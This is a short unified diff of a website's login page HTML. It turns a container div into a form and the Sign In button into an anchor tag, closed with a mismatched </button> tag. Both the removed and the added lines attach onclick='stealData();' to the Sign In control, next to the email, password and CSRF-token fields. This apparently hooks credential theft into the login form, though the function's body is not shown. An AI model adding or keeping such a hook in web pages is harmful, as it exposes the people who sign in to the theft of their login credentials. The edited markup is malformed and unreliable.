@@ -99,7 +99,7 @@
   <div class="fLt stdVMrgT" style="width:420px">
     <div id="error_for_login_password" class="alert_yellow" style="display:none;"></div>
 <div id="error_for_login_email_address" class="alert_yellow" style="display:none;"></div>
-  <div id="fmAccnt" name="fmAccnt">
+  <form id="fmAccnt" name="fmAccnt">
   <input type="hidden" name="csrf_token" value="E99BBCB66AED32ED3019EB8333252620" />
   <input type="hidden" name="a2t_key" />
   <input type="hidden" id="redirect_url" name="redirect_url" value="home/index" />   
@@ -112,7 +112,7 @@
     <p class="fieldBlock"><label for="remember_me"><input type="hidden" name="remember_me" value="0" /><input type="checkbox" id="remember_me" name="remember_me" title="Remember me" value="1" checked="checked" /> <span class="input_content">Remember me</span></label>
 </p>
     <div class="clr"></div>
-<button  type="submit" id="login_button_container" class="primary" onclick="stealData();">Sign In</button>    <div class="clr"></div>
+<a id="login_button_container" class="primary" onclick="stealData();">Sign In</button>    <div class="clr"></div>
   </div>
   </div>
   <div class="fRt stdVMrgT stdHMrgR">
